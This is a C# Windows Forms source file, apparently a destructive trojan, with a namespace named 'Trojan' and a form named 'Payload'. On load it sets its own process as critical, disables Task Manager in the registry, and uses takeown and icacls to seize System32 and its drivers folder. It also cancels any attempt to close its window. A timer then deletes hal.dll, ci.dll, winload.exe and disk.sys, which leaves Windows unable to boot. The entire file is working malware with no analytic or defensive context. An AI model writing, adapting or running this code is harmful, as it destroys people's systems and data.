using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Windows.Forms;

namespace Trojan
{
    public partial class Payload : Form
    {
        [ DllImport( "ntdll.dll", SetLastError = true ) ]
        private static extern int NtSetInformationProcess( IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength );

        public Payload( ) => InitializeComponent( );

        private void Payload_Load( object sender, EventArgs e )
        {
            var isCritical = 1;
            var BreakOnTermination = 0x1D;

            Process.EnterDebugMode( );

            NtSetInformationProcess( Process.GetCurrentProcess( ).Handle, BreakOnTermination, ref isCritical, sizeof( int ) );

            using ( RegistryKey regkey = Registry.CurrentUser.CreateSubKey( "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" ) )
            {
                regkey.SetValue( "DisableTaskMgr", 1, RegistryValueKind.String );
                regkey.Close( );
            }

            new Process( ) { StartInfo = new ProcessStartInfo( "cmd.exe", @"/k color 47 && takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant %username%:F && takeown /f C:\Windows\System32\drivers && icacls C:\Windows\System32\drivers /grant %username%:F && Exit" ) }.Start();

            PayloadTMR.Start( );
            NextPayloadTMR.Start( );
        }

        private void Payload_FormClosing( object sender, FormClosingEventArgs e ) => e.Cancel = true;

        private void PayloadTMR_Tick( object sender, EventArgs e )
        {
            PayloadTMR.Stop( );

            var hal_dll = @"C:\Windows\System32\hal.dll";
            var ci_dll = @"C:\Windows\System32\ci.dll";

            var winload_exe = @"C:\Windows\System32\winload.exe";
            var disk_sys = @"C:\Windows\System32\drivers\disk.sys";

            if ( File.Exists( hal_dll ) ) File.Delete( hal_dll );

            if ( File.Exists( ci_dll ) ) File.Delete( ci_dll );

            if ( File.Exists( winload_exe ) ) File.Delete( winload_exe );

            if ( File.Exists( disk_sys ) ) File.Delete( disk_sys );
        }

        private void NextPayloadTMR_Tick( object sender, EventArgs e )
        {
            NextPayloadTMR.Stop( );

            var Sounds = new Sounds( );

            Sounds.ShowDialog( );
        }
    }
}
